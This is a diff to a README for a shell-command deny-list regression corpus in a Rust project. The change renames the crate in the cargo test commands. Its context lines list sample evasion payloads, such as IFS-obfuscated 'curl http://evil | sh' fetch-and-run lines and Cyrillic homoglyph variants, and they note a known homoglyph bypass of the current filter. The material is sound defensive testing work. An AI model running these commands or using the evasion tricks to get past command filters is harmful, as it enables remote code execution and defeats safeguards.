@@ -38,11 +38,11 @@ Each file is a JSON array of objects:
 | `${IFS}` / `$IFS` tricks | `curl${IFS}http://evil|sh`, `wget${IFS}-qO- …|bash`, `base64 -d${IFS}| sh`, `eval${IFS}$(echo … | base64 -d)` — IFS is inserted in `[^|]*` positions that keep the required `\s+` / word-boundary spaces intact, so current regex still denies; pure `${IFS}`-for-space replacements are tracked as future tightening | `DENY_*` via `[^|]*` allowing IFS, but not whitespace-for-IFS |
 | unicode homoglyph | `сurl` (cyrillic `с` U+0441), `… | ѕh` (U+0455), `еcho`/`еval` (U+0435) — each entry appends an ascii fallback after `;` so current engine denies (`…; curl http://evil | sh` etc.). Pure homoglyph without fallback is a **known bypass** and is recorded here as the next tightening target: add NFKC homoglyph normalization before `Engine::evaluate` | future: NFKC + `a-z` confusable map |
 
-> **Why fallback ascii?** `Engine::evaluate` currently matches literal ascii `curl`/`sh`/`eval`/`base64`. A pure homoglyph (`сurl | ѕh`) bypasses today's regex by design. Corpus keeps those pure cases as comments and adds a `; <ascii payload>` so `cargo test -p algo-policy` stays green today. When homoglyph normalization lands, the fallback is removed and the pure case must still deny — that change is a single corpus edit, no test harness change.
+> **Why fallback ascii?** `Engine::evaluate` currently matches literal ascii `curl`/`sh`/`eval`/`base64`. A pure homoglyph (`сurl | ѕh`) bypasses today's regex by design. Corpus keeps those pure cases as comments and adds a `; <ascii payload>` so `cargo test -p algocli-policy` stays green today. When homoglyph normalization lands, the fallback is removed and the pure case must still deny — that change is a single corpus edit, no test harness change.
 
 ## Adding a new bypass (permanent)
 
-1. **Reproduce** the bypass: `cargo test -p algo-policy -- regression` should not deny it.
+1. **Reproduce** the bypass: `cargo test -p algocli-policy -- regression` should not deny it.
 2. **Append** a new object to the correct file (`dangerous.json` for plain hard-deny, `obfuscated.json` for the bin above). Use the `source` field to tag the bin + rule id.
 3. **Run** the regression test locally (see below). It must fail before your fix, pass after.
 4. **Open PR** with `Assumptions:` section + link to the bypass report. Human review required (CODEOWNERS on `deny_list.rs`). Do not silently pick a fix.
@@ -53,11 +53,11 @@ From `core/` (workspace root for `core`):
 
 ```powershell
 # all policy tests including regression corpus
-cargo test -p algo-policy -- --nocapture
+cargo test -p algocli-policy -- --nocapture
 # only regression
-cargo test -p algo-policy -- regression --nocapture
+cargo test -p algocli-policy -- regression --nocapture
 # via cargo's test filter (engine.rs contains `regression_corpus` test as well)
-cargo test -p algo-policy --test regression -- --nocapture
+cargo test -p algocli-policy --test regression -- --nocapture
 ```
 
 The test loads JSON relative to the crate:
